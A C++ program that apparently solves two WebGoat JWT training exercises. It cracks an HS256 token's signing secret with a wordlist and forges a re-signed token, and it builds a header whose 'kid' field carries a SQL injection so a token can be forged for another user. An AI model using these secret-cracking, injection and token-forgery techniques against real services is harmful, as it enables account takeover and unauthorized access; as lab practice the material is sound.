#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>
#include "base64.h"
#include "openssl/hmac.h"
#include "openssl/evp.h"
#include "openssl/sha.h"


std::string hmac(std::string key, std::string msg,bool print_hex = false){
	
	unsigned int len = SHA256_DIGEST_LENGTH;	
	unsigned char hash[len];
	HMAC_CTX hmac;
	HMAC_CTX_init(&hmac);
	HMAC_Init_ex(&hmac, &key[0], key.length(), EVP_sha256(), NULL);
	HMAC_Update(&hmac, (unsigned char*)&msg[0], msg.length());
	HMAC_Final(&hmac, hash, &len);
	HMAC_CTX_cleanup(&hmac);
	
	std::stringstream ss;
	std::stringstream ss_hex;
	ss << std::setfill('0');
	for(int i = 0; i < len; i++){
		ss_hex << std::hex << std::setw(2) << (unsigned int) hash[i];
		ss << hash[i];
	}
	
	if(print_hex){
		std::cout << ss_hex.str() << std::endl;
	}
	return ss.str();
}

int jwt_dict_cracker(){
	std::string old_token_header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
	std::string old_token_claims = "eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19";
	std::string old_token_sig = "vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM";
	
	
	std::string old_unsigned_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19";

	std::string sig = old_token_sig + ".";
	sig = base64_encode(reinterpret_cast<const unsigned char *>(sig.c_str()), sig.length());
	
	std::ifstream in("google-10000-english/google-10000-english.txt");
	std::vector<std::string> words;

	for(std::string line; std::getline(in,line);){
		std::istringstream str(line);
		for(std::string word; str >> word;){
			//words.push_back( base64_encode( reinterpret_cast<const unsigned char *>(word.c_str()), word.length() ));
			words.push_back(word);		
		}
	}


	for(int i = 0; i < words.size(); i++){
		std::string tmp = hmac(words[i], old_unsigned_token);
		//Twice because i should have encoded it once earlier, not sure where
		tmp = base64_encode(reinterpret_cast<const unsigned char *>(tmp.c_str()), tmp.length(), 1 ); // 1 stands for url-friendly i.e using '=' instead of '.' and '-' instead of '+'
		tmp = base64_encode(reinterpret_cast<const unsigned char *>(tmp.c_str()), tmp.length() );

		if(tmp == sig){
			std::cout << "Key found: " << words[i] << std::endl;
			std::string new_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ";
			
			std::string new_sig = hmac(words[i], new_token);
			new_sig = base64_encode(new_sig,1);

			new_sig.erase(std::remove(new_sig.begin(), new_sig.end(), '.'), new_sig.end());
			new_sig.erase(std::remove(new_sig.begin(), new_sig.end(), '='), new_sig.end());

			new_token += '.' + new_sig;
			
			std::cout << "New token: " << new_token << std::endl;
			return 0;

		}
	}

	return 0;
}

int jwt_new_token(){
	// Replace the kid with the hacked SQL injection given in hints
	std::string new_header = "eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScgZnJvbSBJTkZPUk1BVElPTl9TQ0hFTUEuU1lTVEVNX1VTRVJTIC0tIiwiYWxnIjoiSFMyNTYifQ";
	//Replace the username to "Tom"
	std::string new_claims = "eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiVG9tIiwiRW1haWwiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsIlJvbGUiOlsiQ2F0Il19";

	std::string new_token = new_header + '.' + new_claims;

	std::string key = "deletingTom";
	
	//new_token = base64_encode(reinterpret_cast<const unsigned char *>(new_token.c_str()), new_token.length(),0);

	std::string new_sig = hmac(key,new_token, true);
	new_sig = base64_encode(reinterpret_cast<const unsigned char *>(new_sig.c_str()), new_sig.length(),1);
		
	new_token += '.' + new_sig;
	std::cout << "New token: " << new_token << std::endl;
	 
	return 0;
}

int main(){
	std::cout << "For JWP Tokens, question 4" << std::endl;
	jwt_dict_cracker();

	std::cout << "For JWP Tokens, question 8" << std::endl;
	jwt_new_token();

	return 0;
}
